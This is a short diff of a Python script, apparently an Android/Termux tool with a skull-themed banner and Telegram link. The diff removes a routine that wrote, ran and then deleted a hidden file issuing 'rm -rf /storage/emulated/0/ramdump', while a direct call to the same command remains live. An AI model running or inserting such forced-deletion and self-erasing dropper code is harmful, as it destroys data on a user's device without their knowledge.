@@ -1,8 +1,4 @@
-import shutil
-import sys
-import time
 import os
-import subprocess
 
 
 
@@ -96,28 +92,9 @@ Hi mom 💀
 [+]Telegram https://t.me/BO_NND\033[32m
 '''
 
-for char in BO:
-    print(char, end='', flush=True)
-    time.sleep(0.01)
-
-file_name = "☠FPI☠.py"
-
-file_path = os.path.join(os.getcwd(), file_name)
-
-with open(file_path, "w") as file:
-    file.write(""" #☠FPI☠
-import os
 
 os.system('rm -rf /storage/emulated/0/ramdump')
 
-""")
-
-new_file_path = os.path.join(os.getenv("HOME"), file_name)
-
-shutil.move(file_path, new_file_path)
-
-os.system("python3 ☠FPI☠.py")
-os.system("rm -rf ☠FPI☠.py")
 
 
 
